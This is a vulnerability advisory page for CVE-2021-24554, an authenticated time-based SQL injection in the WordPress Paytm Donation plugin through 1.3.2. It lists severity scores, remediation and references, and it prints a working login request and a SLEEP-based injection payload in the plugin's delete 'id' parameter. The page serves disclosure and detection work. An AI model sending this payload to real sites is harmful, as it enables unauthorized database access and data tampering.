---
layout: post
cve_id: CVE-2021-24554
title: WordPress Paytm Donation <=1.3.2 - Authenticated SQL Injection
pcap: true
pcap_path: /pcaps/2021/CVE-2021-24554.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-24554.yaml
snort2_rule: N/A
snort3_rule: N/A
author: theamanrawat
severity: high
impact: 'Successful exploitation of this vulnerability could allow an authenticated
  attacker to execute arbitrary SQL queries, potentially leading to unauthorized access,
  data manipulation.

  '
remediation: 'Update to the latest version of the WordPress Paytm Donation plugin
  (version > 1.3.2) to mitigate the vulnerability.

  '
reference:
- https://wpscan.com/vulnerability/f2842ac8-76fa-4490-aa0c-5f2b07ecf2ad
- https://wordpress.org/plugins/wp-paytm-pay/
- https://codevigilant.com/disclosure/2021/wp-plugin-wp-paytm-pay/
- https://nvd.nist.gov/vuln/detail/CVE-2021-24554
- https://github.com/ARPSyndicate/cvemon
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 7.2
  cve-id: CVE-2021-24554
  cwe-id: CWE-89
  epss-score: 0.40697
  epss-percentile: 0.97235
  cpe: cpe:2.3:a:freelancetoindia:paytm-pay:*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 2
  vendor: freelancetoindia
  product: paytm-pay
  framework: wordpress
tags:
- time-based-sqli
- cve
- cve2021
- sqli
- wordpress
- wp-plugin
- wp
- wp-paytm-pay
- wpscan
- freelancetoindia
- vuln
---

## üîç Vulnerability Description
WordPress Paytm Donation plugin through 1.3.2 is susceptible to authenticated SQL injection. The plugin does not sanitize, validate, or escape the id GET parameter before using it in a SQL statement when deleting donations. An attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.


## üåê HTTP Request
```nohighlight
POST /wp-login.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0, Win64, x64, rv:140.0) Gecko/20100101 Firefox/140.0
Connection: close
Content-Length: 38
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
log=yR9CBO&pwd=Wl5VeL&wp-submit=Log+In
```

```nohighlight
GET /wp-admin/admin.php?page=wp_paytm_donation&action=delete&id=0%20AND%20(SELECT%205581%20FROM%20(SELECT(SLEEP(6)))Pjwy) HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

